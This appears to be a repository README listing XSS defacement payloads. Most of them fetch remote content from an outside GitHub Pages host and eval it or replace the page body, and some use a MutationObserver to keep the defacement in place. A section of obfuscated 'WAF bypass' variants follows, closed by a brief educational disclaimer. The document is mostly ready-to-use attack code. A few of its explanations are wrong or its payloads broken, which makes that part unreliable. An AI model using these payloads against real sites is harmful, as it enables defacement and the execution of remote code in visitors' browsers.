
# XSS Deface Payloads

This repository contains various XSS (Cross-Site Scripting) deface payloads that can be used to load and execute external content. These payloads demonstrate different methods to achieve this, using various JavaScript techniques and libraries.



### Full-Screen Iframe Injection

```html
<iframe src="https://karthikdude.github.io/Deface/" style="position:fixed; top:0; left:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:9999;"></iframe>
```

**Details:**  
This payload embeds a full-screen iframe pointing to `https://karthikdude.github.io/Deface/`. The styling ensures it occupies the entire viewport with the following features:

---

### Using `setTimeout` for Delayed Execution

```html
<script>
setTimeout(() => {
    fetch('https://karthikdude.github.io/Deface/')
        .then(response => response.text())
        .then(html => {
            document.body.innerHTML = html;
            const scripts = document.body.getElementsByTagName('script');
            for (let script of scripts) {
                eval(script.innerText);
            }
        });
}, 5000);
</script>
```

**Details:** This payload delays the execution of the defacement script by 5 seconds. This can be useful in scenarios where a delay is needed to bypass certain protections or load conditions.

---

### Using `window.location` for Redirection

```html
<script>
window.location = 'https://karthikdude.github.io/Deface/';
</script>
```

**Details:** This payload redirects the user to an external page. This is a simple but effective defacement method that changes the displayed content entirely.

---

### Using `srcdoc` Attribute in an Iframe

```html
<iframe srcdoc="<h1>Hacked!</h1><script>alert('Defaced!')</script>" style="border: none; width: 100%; height: 100%;"></iframe>
```

**Details:** This payload uses the `srcdoc` attribute of an iframe to inject custom HTML and JavaScript. It is a self-contained defacement payload that does not depend on external resources.

---

### Using `fetch` with Dynamic Script Injection

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const script = document.createElement('script');
        script.innerHTML = html;
        document.body.appendChild(script);
    });
</script>
```

**Details:** This payload dynamically creates a script element, injects the fetched content into it, and appends it to the document body.

---

### Using `MutationObserver` for Persistent Defacement

```html
<script>
const observer = new MutationObserver(() => {
    fetch('https://karthikdude.github.io/Deface/')
        .then(response => response.text())
        .then(html => {
            document.body.innerHTML = html;
        });
});
observer.observe(document.body, { childList: true });
</script>
```

**Details:** This payload uses a `MutationObserver` to monitor changes to the `body` element. If the body changes, it reloads the defacement content, ensuring persistence.

---

### Using `navigator.clipboard` to Inject Content

```html
<script>
navigator.clipboard.writeText('<script src="https://karthikdude.github.io/Deface/script.js"></script>');
alert('Clipboard content updated!');
</script>
```

**Details:** This payload writes a malicious script to the clipboard. While it doesn’t directly deface the site, it can trick users into pasting harmful content.

---

### Using `document.createElement` with Image Injection

```html
<script>
const img = document.createElement('img');
img.src = 'https://karthikdude.github.io/Deface/image.jpg';
img.style = 'width: 100%; height: auto;';
document.body.innerHTML = '';
document.body.appendChild(img);
</script>
```

**Details:** This payload replaces the entire content of the page with an image from an external source. It is a visual defacement technique.

---

### Using `onerror` Attribute for Script Execution

```html
<img src="invalid.jpg" onerror="fetch('https://karthikdude.github.io/Deface/').then(res => res.text()).then(eval)">
```

**Details:** This payload uses the `onerror` attribute of an image element to execute a script when the image fails to load.



## Using jQuery to load and execute external content

```html
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$.get('https://karthikdude.github.io/Deface/', function(data) {
    $('body').html(data);
    const scripts = document.body.getElementsByTagName('script');
    for (let script of scripts) {
        eval(script.innerText);
    }
});
</script>
```

**Details:** This payload uses jQuery to perform an AJAX request to fetch the external content and then replaces the entire body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using vanilla JavaScript to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.body.innerHTML = html;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the Fetch API to retrieve the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using XMLHttpRequest to load and execute external content

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://karthikdude.github.io/Deface/', true);
xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {
        document.body.innerHTML = xhr.responseText;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    }
};
xhr.send();
</script>
```

**Details:** This payload uses the XMLHttpRequest object to perform an AJAX request to fetch the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using async/await with Fetch API

```html
<script>
async function deface() {
    const response = await fetch('https://karthikdude.github.io/Deface/');
    const html = await response.text();
    document.body.innerHTML = html;
    const scripts = document.body.getElementsByTagName('script');
    for (let script of scripts) {
        eval(script.innerText);
    }
}
deface();
</script>
```

**Details:** This payload uses async/await syntax with the Fetch API to retrieve the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using Axios to load and execute external content

```html
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
axios.get('https://karthikdude.github.io/Deface/')
    .then(response => {
        document.body.innerHTML = response.data;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the Axios library to perform an AJAX request to fetch the external content and then replaces the body of the document with the fetched content. It also evaluates any script tags within the fetched content.

## Using the `DOMParser` API to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        document.body.innerHTML = doc.body.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the DOMParser API to parse the fetched HTML content and then replaces the body of the document with the parsed content. It also evaluates any script tags within the fetched content.

## Using `innerHTML` with a `div` element to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const div = document.createElement('div');
        div.innerHTML = html;
        document.body.innerHTML = div.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload creates a `div` element, sets its `innerHTML` to the fetched content, and then replaces the body of the document with the `div`'s content. It also evaluates any script tags within the fetched content.

## Using `insertAdjacentHTML` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.body.insertAdjacentHTML('afterbegin', html);
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses the `insertAdjacentHTML` method to insert the fetched content at the beginning of the body. It also evaluates any script tags within the fetched content.

## Using `document.write` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.open();
        document.write(html);
        document.close();
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload uses `document.write` to replace the entire document with the fetched content. It also evaluates any script tags within the fetched content.

## Using `iframe` to load and execute external content

```html
<script>
const iframe = document.createElement('iframe');
iframe.src = 'https://karthikdude.github.io/Deface/';
iframe.style.display = 'none';
document.body.appendChild(iframe);
iframe.onload = function() {
    document.body.innerHTML = iframe.contentDocument.body.innerHTML;
    const scripts = document.body.getElementsByTagName('script');
    for (let script of scripts) {
        eval(script.innerText);
    }
};
</script>
```

**Details:** This payload creates an `iframe` element, sets its `src` to the external content URL, and then replaces the body of the document with the content of the `iframe`. It also evaluates any script tags within the fetched content.

## Using `innerHTML` with `template` element to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const template = document.createElement('template');
        template.innerHTML = html;
        document.body.innerHTML = template.content.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload creates a `template` element, sets its `innerHTML` to the fetched content, and then replaces the body of the document with the `template`'s content. It also evaluates any script tags within the fetched content.

## Using `outerHTML` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        document.body.outerHTML = html;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload replaces the entire `outerHTML` of the body with the fetched content. It also evaluates any script tags within the fetched content.

## Using `innerHTML` with `shadowRoot` to load and execute external content

```html
<script>
fetch('https://karthikdude.github.io/Deface/')
    .then(response => response.text())
    .then(html => {
        const shadowHost = document.createElement('div');
        const shadowRoot = shadowHost.attachShadow({ mode: 'open' });
        shadowRoot.innerHTML = html;
        document.body.innerHTML = shadowRoot.innerHTML;
        const scripts = document.body.getElementsByTagName('script');
        for (let script of scripts) {
            eval(script.innerText);
        }
    });
</script>
```

**Details:** This payload creates a `div` element with a `shadowRoot`, sets the `innerHTML` of the `shadowRoot` to the fetched content, and then replaces the body of the document with the `shadowRoot`'s content. It also evaluates any script tags within the fetched content.


---

### **Advanced WAF Bypassing XSS Payloads**

---

####  **Unicode Obfuscation for Script Tags**

```html
<svg><script>x=String.fromCharCode;fetch('https://karthikdude.github.io/Deface/').then(r=>r.text()).then(c=>eval(c))</script>
```

**Details:**  
- Uses `String.fromCharCode` to generate characters, avoiding direct script keywords.
- Embedded `fetch` call loads an external script dynamically.

---

####  **Double URL Encoding**

```html
<iframe src="javascript&#58;&#x2f;&#x2f;eval&#x28;atob&#x28;'ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9J0hhY2tlZCEn'&#x29;&#x29;" style="border:0;width:100%;height:100%;"></iframe>
```

**Details:**  
- Encodes `javascript:` and `eval()` using double URL encoding.
- Decoded content defaces the page upon execution.

---

####  **Dynamic Attribute Injection**

```html
<a href="javascript:void(0)" id="x" onclick="fetch('https://karthikdude.github.io/Deface/').then(r=>r.text()).then(eval)">Click</a>
<script>document.getElementById('x').setAttribute('onclick', atob('ZmV0Y2goJ2h0dHBzOi8va2FydGhpayd1ZGUuZ2l0aHViLmlvL0RlZmFjZS8nKS50aGVuKHIpLnRleHQoKS50aGVuKGV2YWwp'));</script>
```

**Details:**  
- Dynamically injects obfuscated attributes to evade static WAF rules.
- Uses `atob()` to decode the payload at runtime.

---

####  **Polyglot Payload with SVG**

```html
<svg/onload="fetch('https://karthikdude.github.io/Deface/').then(r=>r.text()).then(eval)">
```

**Details:**  
- Uses the `onload` event in an SVG element to execute JavaScript.
- Compact and effective against less rigorous WAFs.

---

####  **Case-Insensitive Keyword Mutation**

```html
<SvG><ScRiPt src="https://karthikdude.github.io/Deface/script.js"></sCrIpT></sVg>
```

**Details:**  
- Capitalizes and mixes case in tag names to bypass case-sensitive WAF filters.
- Loads an external defacement script.

---

####  **Null Byte Injection**

```html
<script src=https://karthikdude.github.io/Deface/script.js%00.js></script>
```

**Details:**  
- Appends a null byte (`%00`) to the script URL to bypass strict file extension checks.
- Effective against WAFs that validate `.js` extensions.

---

####  **HTML Entity Encoding**

```html
<script>&lt;img src=x onerror=eval(decodeURIComponent('%66%65%74%63%68%28%27https%3A%2F%2Fkarthikdude.github.io%2FDeface%2F%27%29%2E%74%68%65%6E%28%72%3D%3E%72%2E%74%65%78%74%28%29%29%2E%74%68%65%6E%28%65%76%61%6C%29'))&gt;</script>
```

**Details:**  
- Encodes the payload in HTML entities to evade WAF pattern matching.
- Decodes and executes the defacement payload at runtime.

---

####  **Chained Event Handlers**

```html
<div style="animation-name:rotate" onanimationstart="fetch('https://karthikdude.github.io/Deface/').then(r=>r.text()).then(eval)"></div>
<style>@keyframes rotate {}</style>
```

**Details:**  
- Uses the `animationstart` event to execute JavaScript when an animation begins.
- Exploits non-standard event listeners.

---

####  **Inline SVG with Data URI**

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    fetch('https://karthikdude.github.io/Deface/')
      .then(r => r.text())
      .then(deface => { document.body.innerHTML = deface; });
  ]]></script>
</svg>
```

**Details:**  
- Encodes the SVG payload inline, using `CDATA` to encapsulate JavaScript.
- Bypasses filters targeting standard `<script>` elements.

---

####  **DOM-Based XSS with Trusted Context**

```html
<script>
(function() {
    const payload = document.createElement('iframe');
    payload.src = 'javascript:fetch("https://karthikdude.github.io/Deface/").then(r=>r.text()).then(eval)';
    document.body.appendChild(payload);
})();
</script>
```

**Details:**  
- Dynamically creates an iframe element with a `javascript:` URL scheme.
- Uses a trusted context (the DOM) to inject the malicious payload.


## Disclaimer

These payloads are for educational purposes only. Always ensure you have proper authorization and are acting ethically when testing or using such payloads. Unauthorized use of these payloads can be illegal and unethical.
```
